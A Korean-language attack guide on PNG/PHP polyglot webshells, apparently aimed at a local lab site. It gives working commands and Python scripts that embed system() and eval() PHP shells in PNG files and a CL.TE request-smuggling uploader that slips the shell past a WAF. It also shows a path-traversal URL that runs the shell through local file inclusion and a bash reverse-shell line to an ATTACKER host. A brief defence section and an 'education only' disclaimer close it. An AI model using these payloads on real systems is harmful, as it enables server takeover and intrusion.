# 🖼️ PNG 웹쉘 (Polyglot File) 공격 가이드

## 🎯 개념

**PNG 웹쉘 = 정상 이미지 + PHP 코드**

파일이 PNG 매직 바이트로 시작하여:
- ✅ 이미지 뷰어로 열면 → 정상 이미지
- ✅ PHP로 실행하면 → 웹쉘 동작
- ✅ MIME 검증 우회
- ✅ 매직 바이트 검증 우회
- ✅ WAF 우회 (이미지로 인식)

---

## 🛠️ 방법 1: PNG 주석에 PHP 코드 삽입 (가장 간단)

### Step 1: PNG 웹쉘 생성

```bash
# 작은 PNG 이미지 생성 (1x1 투명 픽셀)
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x0a\x49\x44\x41\x54\x78\x9c\x63\x00\x01\x00\x00\x05\x00\x01\x0d\x0a\x2d\xb4\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82' > shell.png

# PHP 코드 추가
echo '<?php system($_GET["cmd"]); ?>' >> shell.png

# 또는 한 줄로
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\x0a\x49\x44\x41\x54\x78\x9c\x63\x00\x01\x00\x00\x05\x00\x01\x0d\x0a\x2d\xb4\x00\x00\x00\x00\x49\x45\x4e\x44\xae\x42\x60\x82<?php system($_GET["cmd"]); ?>' > shell.png
```

### Step 2: 검증

```bash
# PNG 매직 바이트 확인
file shell.png
# 출력: shell.png: PNG image data, 1 x 1, 8-bit/color RGBA, non-interlaced

# PHP 코드 확인
cat shell.png | tail -c 50
# 출력: <?php system($_GET["cmd"]); ?>

# 이미지 뷰어로 열기 (정상 이미지로 보임)
```

### Step 3: 업로드

#### 일반 업로드 (WAF 없을 때)
```bash
curl -X POST http://localhost:9000/api/submit_inquiry.php \
  -F "name=test" \
  -F "email=test@test.com" \
  -F "phone=010-1234-5678" \
  -F "category=technical" \
  -F "subject=test" \
  -F "message=test" \
  -F "image=@shell.png"
```

**WAF 반응**:
```
✅ 파일명: .png → 통과
✅ MIME 타입: image/png → 통과
✅ 매직 바이트: \x89PNG → 통과
⚠️ PHP 코드: <?php system → Rule 999001 차단 가능
```

#### Request Smuggling (WAF 우회)
```bash
python3 smuggle_png_webshell.py
```

### Step 4: LFI로 실행

**중요**: PNG 파일을 **직접 접근하면 이미지로 다운로드**됨. PHP로 실행하려면 **LFI 취약점** 필요!

```bash
# 방법 1: LFI 취약점 이용 (support.php)
curl "http://localhost:9000/support.php?lang=../../uploads&page=shell.png&cmd=whoami"

# 방법 2: .htaccess 조작 (불가능할 수 있음)
# 방법 3: PHP 파일에서 include (별도 취약점 필요)
```

**결과**:
```
www-data
[PNG 이미지 데이터 + 출력]
```

---

## 🛠️ 방법 2: PNG tEXt 청크에 PHP 코드 삽입 (고급)

### Python 스크립트로 생성

```python
#!/usr/bin/env python3
"""
PNG 웹쉘 생성기 (tEXt 청크에 PHP 코드 삽입)
"""

import struct
import zlib

def create_png_chunk(chunk_type, data):
    """PNG 청크 생성"""
    chunk_data = chunk_type + data
    crc = zlib.crc32(chunk_data) & 0xffffffff
    return struct.pack('>I', len(data)) + chunk_data + struct.pack('>I', crc)

def create_png_webshell(output_file='shell.png', php_code='<?php system($_GET["c"]); ?>'):
    """PNG 웹쉘 생성"""

    # PNG 시그니처
    png_signature = b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'

    # IHDR 청크 (1x1 픽셀 RGBA)
    width = height = 1
    ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 6, 0, 0, 0)
    ihdr_chunk = create_png_chunk(b'IHDR', ihdr_data)

    # tEXt 청크에 PHP 코드 삽입
    text_data = b'Comment\x00' + php_code.encode('latin-1')
    text_chunk = create_png_chunk(b'tEXt', text_data)

    # IDAT 청크 (이미지 데이터)
    idat_data = b'\x78\x9c\x63\x00\x01\x00\x00\x05\x00\x01'
    idat_chunk = create_png_chunk(b'IDAT', idat_data)

    # IEND 청크 (종료)
    iend_chunk = create_png_chunk(b'IEND', b'')

    # 전체 PNG 파일 생성
    png_data = png_signature + ihdr_chunk + text_chunk + idat_chunk + iend_chunk

    with open(output_file, 'wb') as f:
        f.write(png_data)

    print(f"[+] PNG webshell created: {output_file}")
    print(f"[+] File size: {len(png_data)} bytes")
    print(f"[+] PHP code: {php_code}")

    # 검증
    with open(output_file, 'rb') as f:
        header = f.read(8)
        if header == png_signature:
            print("[+] ✅ Valid PNG signature")
        else:
            print("[!] ❌ Invalid PNG signature")

if __name__ == "__main__":
    # 간단한 웹쉘
    create_png_webshell('shell.png', '<?php system($_GET["c"]); ?>')

    # 고급 웹쉘
    create_png_webshell('advanced.png', '<?php @eval($_POST["p"]); ?>')
```

**실행**:
```bash
python3 create_png_webshell.py
```

---

## 🛠️ 방법 3: 실제 이미지 + PHP 코드 (최고 은밀성)

### exiftool 사용

```bash
# 진짜 이미지 준비
wget https://via.placeholder.com/150.png -O image.png

# EXIF Comment에 PHP 코드 삽입
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png

# 또는 직접 추가
echo '<?php system($_GET["cmd"]); ?>' >> image.png

# 새 파일로 저장
mv image.png shell.png
```

**검증**:
```bash
# 이미지로 열기 (정상 동작)
display shell.png  # Linux
open shell.png     # Mac
# Windows: 더블클릭

# MIME 타입 확인
file --mime-type shell.png
# 출력: image/png

# 매직 바이트 확인
hexdump -C shell.png | head -1
# 출력: 00000000  89 50 4e 47 0d 0a 1a 0a  ...
```

---

## 🚀 Request Smuggling + PNG 웹쉘

### Python 스크립트

```python
#!/usr/bin/env python3
import socket
import struct

def create_png_webshell_inline():
    """PNG 웹쉘 바이너리 생성"""
    png_sig = b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a'
    # 1x1 투명 PNG (최소 크기)
    png_data = (
        b'\x00\x00\x00\x0d\x49\x48\x44\x52'
        b'\x00\x00\x00\x01\x00\x00\x00\x01'
        b'\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
        b'\x00\x00\x00\x0a\x49\x44\x41\x54'
        b'\x78\x9c\x63\x00\x01\x00\x00\x05\x00\x01'
        b'\x0d\x0a\x2d\xb4'
        b'\x00\x00\x00\x00\x49\x45\x4e\x44'
        b'\xae\x42\x60\x82'
    )
    php_code = b'<?php system($_GET["c"]); ?>'
    return png_sig + png_data + php_code

def smuggle_png_webshell(host='localhost', port=9000, filename='shell.png'):
    """PNG 웹쉘을 Smuggling으로 업로드"""

    print(f"[*] Target: {host}:{port}")
    print(f"[*] Filename: {filename}\n")

    # PNG 웹쉘 생성
    png_webshell = create_png_webshell_inline()
    print(f"[+] PNG webshell size: {len(png_webshell)} bytes")

    # Multipart boundary
    boundary = b'----WebKitFormBoundary7MA4YWxkTrZu0gW'

    # Multipart body
    multipart_body = (
        b'--' + boundary + b'\r\n'
        b'Content-Disposition: form-data; name="name"\r\n\r\n'
        b'test\r\n'

        b'--' + boundary + b'\r\n'
        b'Content-Disposition: form-data; name="email"\r\n\r\n'
        b'test@test.com\r\n'

        b'--' + boundary + b'\r\n'
        b'Content-Disposition: form-data; name="phone"\r\n\r\n'
        b'010-1234-5678\r\n'

        b'--' + boundary + b'\r\n'
        b'Content-Disposition: form-data; name="category"\r\n\r\n'
        b'technical\r\n'

        b'--' + boundary + b'\r\n'
        b'Content-Disposition: form-data; name="subject"\r\n\r\n'
        b'Image Upload\r\n'

        b'--' + boundary + b'\r\n'
        b'Content-Disposition: form-data; name="message"\r\n\r\n'
        b'PNG webshell test\r\n'

        b'--' + boundary + b'\r\n'
        b'Content-Disposition: form-data; name="image"; filename="' + filename.encode() + b'"\r\n'
        b'Content-Type: image/png\r\n\r\n'
        + png_webshell + b'\r\n'

        b'--' + boundary + b'--\r\n'
    )

    # Smuggled 요청
    smuggled_request = (
        b'POST /api/submit_inquiry.php HTTP/1.1\r\n'
        b'Host: localhost:9000\r\n'
        b'Content-Type: multipart/form-data; boundary=' + boundary + b'\r\n'
        b'Content-Length: ' + str(len(multipart_body)).encode() + b'\r\n'
        b'\r\n'
        + multipart_body
    )

    # CL.TE Smuggling
    payload = (
        b'POST / HTTP/1.1\r\n'
        b'Host: localhost:9000\r\n'
        b'Content-Length: ' + str(len(smuggled_request)).encode() + b'\r\n'
        b'Transfer-Encoding: chunked\r\n'
        b'\r\n'
        b'0\r\n\r\n'
        + smuggled_request
    )

    try:
        sock = socket.socket()
        sock.connect((host, port))
        print("[*] Connected!\n")

        print("[*] Sending smuggling payload...")
        sock.sendall(payload)
        print("[+] Sent!\n")

        # 첫 번째 응답
        sock.settimeout(2)
        resp1 = sock.recv(4096)
        print("[*] Response 1 received\n")

        # 트리거 요청
        sock.sendall(b'GET /index.php HTTP/1.1\r\nHost: localhost:9000\r\n\r\n')
        resp2 = sock.recv(8192)

        if b'"success":true' in resp2:
            print("[+] ✅ PNG webshell uploaded!")
            print(f"[+] URL: http://{host}:{port}/uploads/{filename}")
            print(f"\n[*] Exploit via LFI:")
            print(f"    curl 'http://{host}:{port}/support.php?lang=../../uploads&page={filename}&c=id'")
        else:
            print("[!] Upload may have failed")
            print(resp2[:300].decode('utf-8', errors='ignore'))

        sock.close()
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    smuggle_png_webshell()
```

**실행**:
```bash
python3 smuggle_png_webshell.py
```

---

## 🎯 PNG 웹쉘의 장점

| 특징 | PHP 웹쉘 | PNG 웹쉘 |
|-----|---------|---------|
| **파일명 필터** | ❌ .php 차단됨 | ✅ .png 통과 |
| **MIME 타입 검증** | ❌ application/x-php | ✅ image/png |
| **매직 바이트 검증** | ❌ `<?php` | ✅ `\x89PNG` |
| **WAF 탐지** | ⚠️ 높음 | ✅ 낮음 (이미지로 인식) |
| **직접 실행** | ✅ 가능 | ❌ LFI 필요 |
| **은닉성** | 🔴 낮음 | 🟢 높음 |

---

## 🔍 WAF 반응 비교

### PHP 웹쉘 (shell.php)
```
ModSecurity Rule 999004: PHP File Upload Blocked
ModSecurity Rule 999001: PHP Code Execution Function Detected
→ ❌ 차단됨
```

### PNG 웹쉘 (shell.png)
```
파일명 검사: .png → ✅ 통과
MIME 검사: image/png → ✅ 통과
매직 바이트: \x89PNG → ✅ 통과
Body 검사: <?php system → ⚠️ 차단 가능 (Rule 999001)
```

### PNG 웹쉘 + Smuggling
```
Nginx: POST / → Body 파싱 안 함
→ ✅ 모든 검사 우회!
```

---

## 🎯 실전 공격 플로우

```
1. PNG 웹쉘 생성
   ↓
2. Request Smuggling으로 업로드
   ↓
3. 업로드 경로 확인 (uploads/shell.png)
   ↓
4. LFI 취약점 찾기 (support.php?page=...)
   ↓
5. PNG 웹쉘 실행
   curl "http://target/support.php?lang=../../uploads&page=shell.png&c=whoami"
   ↓
6. 리버스쉘 획득
   curl "...&c=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'"
```

---

## 🛡️ 방어 방법

### 1. 파일 내용 전체 스캔
```php
// 업로드된 파일 전체를 읽어서 PHP 태그 검사
$content = file_get_contents($file['tmp_name']);
if (preg_match('/<\?php|<\?=/', $content)) {
    throw new Exception('PHP code detected in file');
}
```

### 2. 이미지 재처리
```php
// 이미지를 다시 인코딩하여 메타데이터 제거
$img = imagecreatefrompng($file['tmp_name']);
imagepng($img, $target_path);
imagedestroy($img);
// 이렇게 하면 PHP 코드가 제거됨
```

### 3. LFI 방어
```php
// include 경로 화이트리스트
$allowed = ['common.php', 'menu.php'];
if (!in_array($page, $allowed)) {
    die('Invalid page');
}
```

### 4. WAF 규칙 강화
```apache
# modsecurity_custom.conf에 추가
SecRule FILES_TMPNAMES "@inspectFile /usr/bin/detect_php_in_image.sh" \
    "id:999030,\
    phase:2,\
    block,\
    log,\
    msg:'PHP Code Detected in Image File'"
```

---

## 🎓 결론

### Q: PNG 웹쉘이 PHP 웹쉘보다 나은가?

**A: 상황에 따라 다름**

**PNG 웹쉘 추천 상황**:
- ✅ MIME 타입 검증이 있을 때
- ✅ 파일 확장자 필터가 있을 때
- ✅ 매직 바이트 검증이 있을 때
- ✅ LFI 취약점이 존재할 때

**PHP 웹쉘 추천 상황**:
- ✅ 아무 검증도 없을 때
- ✅ 직접 실행 가능할 때 (uploads/ 폴더 실행 권한)
- ✅ 간단하게 사용하고 싶을 때

**최고의 조합**:
```
Request Smuggling + PNG 웹쉘 + LFI = 🎯 완벽!
```

---

**교육 목적으로만 사용하세요!** 🎓
